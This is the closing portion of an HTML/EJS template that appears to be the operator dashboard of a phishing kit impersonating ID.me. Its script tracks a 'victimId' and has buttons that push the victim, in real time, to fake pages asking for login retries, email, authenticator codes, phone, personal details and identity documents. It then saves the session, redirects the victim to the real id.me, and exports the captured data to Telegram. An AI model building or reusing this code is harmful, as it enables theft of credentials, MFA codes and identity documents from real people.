    <!-- JSVector Maps MapsJS -->
    <script src="/assets/libs/jsvectormap/maps/world-merc.js"></script>

    <!-- Apex Charts JS -->
    <script src="/assets/libs/apexcharts/apexcharts.min.js"></script>

    <!-- Chartjs Chart JS -->
    <script src="/assets/libs/chart.js/chart.min.js"></script>

    <!-- CRM-Dashboard -->
    <script src="/assets/js/crm-dashboard.js"></script>


    <!-- Custom-Switcher JS -->
    <script src="/assets/js/custom-switcher.min.js"></script>

    <!-- Custom JS -->
    <script src="/assets/js/custom.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.3.2/socket.io.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <input type="hidden" value="<%= victimId %>" id="vcId">
    <script>
        const socket = io();
        const vcId = document.getElementById('vcId').value
        function refreshPage() {
            location.reload();
        }

        // Set the timeout to refresh the page after 10 seconds (10000 milliseconds)
        setTimeout(refreshPage, 10000);

        document.getElementById('loginBtn').addEventListener('click', () => {
            axios.post('/admin/api/getUrl', {
                url: '/session/incorrect',
                vcId: vcId
            })
                .then(function (response) {
                    console.log(response);
                })
                .catch(function (error) {
                    console.log(error);
                });
        })

        document.getElementById('mailBtn').addEventListener('click', () => {
            axios.post('/admin/api/getUrl', {
                url: '/session/email',
                vcId: vcId
            })
                .then(function (response) {
                    console.log(response);
                })
                .catch(function (error) {
                    console.log(error);
                });
        })

        document.getElementById('mfaBtn').addEventListener('click', () => {
            axios.post('/admin/api/getUrl', {
                url: '/session/authenticator',
                vcId: vcId
            })
                .then(function (response) {
                    console.log(response);
                })
                .catch(function (error) {
                    console.log(error);
                });
        })

        document.getElementById('phoneBtn').addEventListener('click', () => {
            axios.post('/admin/api/getUrl', {
                url: '/session/phone',
                vcId: vcId
            })
                .then(function (response) {
                    console.log(response);
                })
                .catch(function (error) {
                    console.log(error);
                });
        })

        document.getElementById('personalBtn').addEventListener('click', () => {
            axios.post('/admin/api/getUrl', {
                url: '/session/personal',
                vcId: vcId
            })
                .then(function (response) {
                    console.log(response);
                })
                .catch(function (error) {
                    console.log(error);
                });
        })

        document.getElementById('docsBtn').addEventListener('click', () => {
            axios.post('/admin/api/getUrl', {
                url: '/session/identity',
                vcId: vcId
            })
                .then(function (response) {
                    console.log(response);
                })
                .catch(function (error) {
                    console.log(error);
                });
        })

        document.getElementById('completeBtn').addEventListener('click', () => {
            axios.post('/admin/api/saveSession', {
                vcId: vcId
            })
                .then(function (response) {
                    console.log(response);
                })
                .catch(function (error) {
                    console.log(error);
                });

            axios.post('/admin/api/getUrl', {
                url: 'https://www.id.me/',
                vcId: vcId
            })
                .then(function (response) {
                    console.log(response);
                })
                .catch(function (error) {
                    console.log(error);
                });
        })

        document.getElementById('exportBtn').addEventListener('click', () => {
            axios.post('/admin/api/exportTelegram', {
                vcId: vcId
            })
                .then(function (response) {
                    console.log(response);
                })
                .catch(function (error) {
                    console.log(error);
                });
        })
    </script>
</body>

